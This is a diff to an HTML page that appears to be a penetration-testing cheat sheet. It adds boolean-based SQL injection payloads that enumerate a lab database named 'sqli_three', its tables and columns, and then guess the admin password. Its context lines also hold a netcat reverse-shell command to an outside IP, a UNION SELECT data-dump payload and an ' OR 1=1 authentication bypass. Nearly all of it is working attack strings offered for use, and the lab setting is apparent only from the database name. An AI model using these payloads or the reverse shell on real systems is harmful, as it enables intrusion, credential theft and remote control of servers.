@@ -291,6 +291,17 @@ nc -e /bin/sh 10.20.14 8080<br>
     use <i>UNION SELECT 1,2,group_concat([col_name1,':',col_name2,SEPARATOR '&lt;br&gt;') FROM [table_name]</i> -- To see target columns data.<br>
   </p>
    <p>bypass common auth vulnerability using: <i>' OR 1=1;-- </i></p>
+   <h3>Exploit boolean-based SQL injection</h3>
+   <p>admin123' UNION SELECT 1,2,3 where database() like '%';--
+    admin123' UNION SELECT 1,2,3 where database() like 's%';--
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+    admin123' UNION SELECT 1,2,3 from users where username like 'a%
+    admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+    
+   </p>
 </div>
    <!-- Exploitation section end here  -->
 </body>
